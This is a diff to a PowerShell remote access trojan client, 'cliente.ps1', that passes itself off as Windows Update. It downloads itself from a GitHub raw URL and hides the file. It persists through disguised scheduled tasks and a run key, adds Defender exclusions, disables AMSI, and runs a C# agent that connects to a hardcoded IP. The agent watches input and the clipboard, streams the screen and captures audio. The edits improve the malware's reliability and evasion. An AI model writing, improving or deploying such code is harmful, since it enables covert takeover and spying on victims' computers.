@@ -1,5 +1,6 @@
 # language: PowerShell, file: cliente.ps1, target: Windows 10/11, PowerShell 5.1
 
+$ErrorActionPreference = 'SilentlyContinue'
 $serverIP = "198.1.195.204"
 $serverPort = 4000
 
@@ -13,9 +14,9 @@ $myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/
 
 function Get-InteractiveUser {
     try {
-        $e = Get-CimInstance Win32_Process -Filter "Name='explorer.exe'" -EA Stop | Select -First 1
+        $e = Get-CimInstance Win32_Process -Filter "Name='explorer.exe'" -ErrorAction Stop | Select -First 1
         if ($e) {
-            $o = Invoke-CimMethod -InputObject $e -MethodName GetOwner -EA Stop
+            $o = Invoke-CimMethod -InputObject $e -MethodName GetOwner -ErrorAction Stop
             if ($o -and $o.User) {
                 $sid = (New-Object Security.Principal.NTAccount($o.Domain, $o.User)).Translate([Security.Principal.SecurityIdentifier]).Value
                 return [pscustomobject]@{ Found = $true; Name = $o.User; Domain = $o.Domain; Sid = $sid }
@@ -36,7 +37,7 @@ function New-TaskXml {
         $principal = "<UserId>$Sid</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel>"
         $start     = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ss')
         $triggers  = "<LogonTrigger><Enabled>true</Enabled><UserId>$Sid</UserId></LogonTrigger>" +
-                     "<TimeTrigger><StartBoundary>$start</StartBoundary><Repetition><Interval>PT2M</Interval><Duration>P3650D</Duration><StopAtEnd>false</StopAtEnd></Repetition><Enabled>true</Enabled></TimeTrigger>"
+                     "<TimeTrigger><StartBoundary>$start</StartBoundary><Repetition><Interval>PT2M</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition><Enabled>true</Enabled></TimeTrigger>"
     }
     @"
 <?xml version="1.0" encoding="UTF-16"?>
@@ -65,23 +66,22 @@ function Install-Task {
     $t = Join-Path $Dir ("t_" + [guid]::NewGuid().ToString("N") + ".xml")
     [IO.File]::WriteAllText($t, $Xml, [Text.Encoding]::Unicode)
     $p = Start-Process schtasks.exe -ArgumentList "/create /tn `"$Name`" /xml `"$t`" /f" -WindowStyle Hidden -Wait -PassThru
-    Remove-Item $t -Force -EA 0
+    Remove-Item $t -Force -ErrorAction SilentlyContinue
     return ($p.ExitCode -eq 0)
 }
 
 function Repair-Installation {
     param([switch]$Trigger)
-    $EAP = 'SilentlyContinue'
     $base = "$env:ProgramData\Microsoft\Windows\Caches"
     $sys  = ([Security.Principal.WindowsIdentity]::GetCurrent()).IsSystem
     $u    = Get-InteractiveUser
     $canUser = (-not $sys) -or $u.Found
 
-    $dirs = @(Get-ChildItem $base -Directory -EA 0 | ? { $_.Name -match '^[0-9a-f]{8}$' -and (Test-Path (Join-Path $_.FullName '.r9k')) })
+    $dirs = @(Get-ChildItem $base -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -match '^[0-9a-f]{8}$' -and (Test-Path (Join-Path $_.FullName '.r9k')) })
     if (-not $dirs) {
         $d = Join-Path $base $h
-        New-Item -ItemType Directory -Path $d -Force | Out-Null
-        Set-Content (Join-Path $d '.r9k') $h -Force
+        New-Item -ItemType Directory -Path $d -Force -ErrorAction SilentlyContinue | Out-Null
+        Set-Content (Join-Path $d '.r9k') $h -Force -ErrorAction SilentlyContinue
         $dirs = @(Get-Item $d)
     }
 
@@ -93,11 +93,29 @@ function Repair-Installation {
         $taskB  = "MicrosoftWindowsUpdateBoot_$leaf"
         $runKey = "WinUpdateSvc_$leaf"
 
-        if ((-not (Test-Path $script)) -or ((Get-Item $script).Length -lt 1024)) {
-            try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-                  (New-Object Net.WebClient).DownloadFile($myUrl, $script) } catch {}
+        # Correção de download blindada
+        $needDownload = $false
+        if (-not (Test-Path $script)) {
+            $needDownload = $true
+        } else {
+            $len = (Get-Item $script -ErrorAction SilentlyContinue).Length
+            if ($len -eq $null -or $len -lt 1024) { $needDownload = $true }
         }
-        if (Test-Path $script) { try { (Get-Item $script).Attributes = 'Hidden,System,ReadOnly' } catch {} }
+
+        if ($needDownload) {
+            try { 
+                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+                (New-Object Net.WebClient).DownloadFile($myUrl, $script) 
+            } catch {
+                try {
+                    Invoke-WebRequest -Uri $myUrl -OutFile $script -UseBasicParsing -TimeoutSec 15 -ErrorAction SilentlyContinue
+                } catch {}
+            }
+        }
+
+        if (Test-Path $script) { 
+            try { (Get-Item $script).Attributes = 'Hidden,System,ReadOnly' } catch {} 
+        }
 
         $vbs = Join-Path $dir "WinUpdateSvc_$leaf.vbs"
         if (Test-Path $vbs) { try { (Get-Item $vbs).Attributes='Normal'; Remove-Item $vbs -Force } catch {} }
@@ -120,7 +138,7 @@ function Repair-Installation {
         $inner = "`$p='$script';if(-not(Test-Path `$p)){`$d=Split-Path `$p;md `$d -Force|Out-Null;try{(New-Object Net.WebClient).DownloadFile('$myUrl',`$p)}catch{}};if(Test-Path `$p){& `$p -silent -repair -Trigger}"
         Install-Task $taskB (New-TaskXml "Microsoft Windows Update Boot" "powershell.exe" "-nop -w hidden -ep bypass -c `"$inner`"" "" -Boot) $dir | Out-Null
 
-        try { Add-MpPreference -ExclusionPath $dir -Force } catch {}
+        try { Add-MpPreference -ExclusionPath $dir -Force -ErrorAction SilentlyContinue } catch {}
         if ($Trigger -and $canUser) { schtasks /run /tn $taskU 2>$null | Out-Null }
     }
 }
@@ -129,7 +147,6 @@ if ($args -contains '-repair') { Repair-Installation -Trigger:($args -contains '
 
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
-    # -NoExit e sem -WindowStyle Hidden para o console elevado ficar visivel e mostrar erros
     try { Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -NoExit -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
     exit
 }
@@ -142,7 +159,7 @@ if ($args -notcontains "-silent") {
     try {
         $mp = Get-MpComputerStatus -ErrorAction Stop
         if ($mp -and ((-not $mp.RealTimeProtectionEnabled) -or (-not $mp.AntivirusEnabled))) { $defenderOff = $true }
-    } catch { }
+    } catch { $defenderOff = $true } # Se o cmdlet falhar, assume desativado
 
     if (-not $defenderOff) {
         $sd = "$env:TEMP\sd_$h"
@@ -169,7 +186,7 @@ if ($args -notcontains "-silent") {
     }
 
     New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
-    Set-Content (Join-Path $dir '.r9k') $h -Force
+    Set-Content (Join-Path $dir '.r9k') $h -Force -ErrorAction SilentlyContinue
     try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
 
     Repair-Installation -Trigger
@@ -185,7 +202,7 @@ if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,
 $stamp = Join-Path $dir '.repair'
 $need  = $true
 if (Test-Path $stamp) { if (((Get-Date) - (Get-Item $stamp).LastWriteTime).TotalMinutes -lt 5) { $need = $false } }
-if ($need) { Repair-Installation; Set-Content $stamp (Get-Date).ToString('o') -Force }
+if ($need) { Repair-Installation; Set-Content $stamp (Get-Date).ToString('o') -Force -ErrorAction SilentlyContinue }
 
 $mutex = New-Object System.Threading.Mutex($false, $mutexName)
 if (-not $mutex.WaitOne(0)) { exit }
@@ -333,6 +350,7 @@ if (-not ("R9KAgent" -as [type])) {
         public static void Start(string ip, int port) {
             IP = ip; PORT = port;
             try { SetProcessDPIAware(); } catch {}
+            Log("Iniciando agente. Tentando conectar em " + IP + ":" + PORT);
             Thread tWatch = new Thread(WatchdogLoop); tWatch.IsBackground = true; tWatch.Start();
             Thread tInput = new Thread(InputLoop); tInput.IsBackground = true; tInput.Start();
             Thread tClip = new Thread(ClipboardWatcher); tClip.IsBackground = true; tClip.Start();
@@ -345,14 +363,13 @@ if (-not ("R9KAgent" -as [type])) {
                     myClient.NoDelay = true;
                     myClient.SendTimeout = 30000;
                     myClient.ReceiveTimeout = 0;
-                    Log("Iniciando conexao com " + IP + ":" + PORT + "...");
                     IAsyncResult ar = myClient.BeginConnect(IP, PORT, null, null);
                     if (!ar.AsyncWaitHandle.WaitOne(5000)) { 
-                        Log("TIMEOUT: O servidor " + IP + ":" + PORT + " nao respondeu em 5s. Porta fechada ou IP errado?");
+                        Log("TIMEOUT de conexao. Servidor " + IP + " nao respondeu.");
                         myClient.Close(); throw new Exception("connect timeout"); 
                     }
                     myClient.EndConnect(ar);
-                    Log("CONECTADO! Enviando BANNER para a lista...");
+                    Log("CONECTADO! Enviando BANNER...");
                     NetworkStream myStream = myClient.GetStream();
                     StreamReader myReader = new StreamReader(myStream, new UTF8Encoding(false));
                     StreamWriter myWriter = new StreamWriter(myStream, new UTF8Encoding(false));
@@ -369,13 +386,13 @@ if (-not ("R9KAgent" -as [type])) {
                     
                     while (!connClosed) {
                         if ((DateTime.UtcNow - lastPongTime).TotalSeconds > 90) { 
-                            Log("Conexao morreu: Sem resposta PONG do servidor ha 90s.");
+                            Log("Conexao morreu: Sem PONG ha 90s.");
                             connClosed = true; break; 
                         }
                         Thread.Sleep(2000);
                     }
                 } catch (Exception ex) {
-                    Log("FALHA NA CONEXAO: " + ex.Message);
+                    Log("FALHA: " + ex.Message);
                 } finally {
                     streaming = false;
                     isAudioRunning = false;
@@ -394,7 +411,7 @@ if (-not ("R9KAgent" -as [type])) {
                     failCount = 0;
                 } catch {
                     failCount++;
-                    if (failCount > 8) { Log("Heartbeat caiu 8 vezes. Desconectando."); connClosed = true; break; }
+                    if (failCount > 8) { connClosed = true; break; }
                     Thread.Sleep(2000);
                 }
                 Thread.Sleep(20000);
@@ -490,7 +507,7 @@ if (-not ("R9KAgent" -as [type])) {
                     }
                 } catch {
                     failCount++;
-                    if (failCount > 8) { Log("Stream caiu 8 vezes. Desconectando."); connClosed = true; break; }
+                    if (failCount > 8) { connClosed = true; break; }
                     Thread.Sleep(500);
                 }
             }
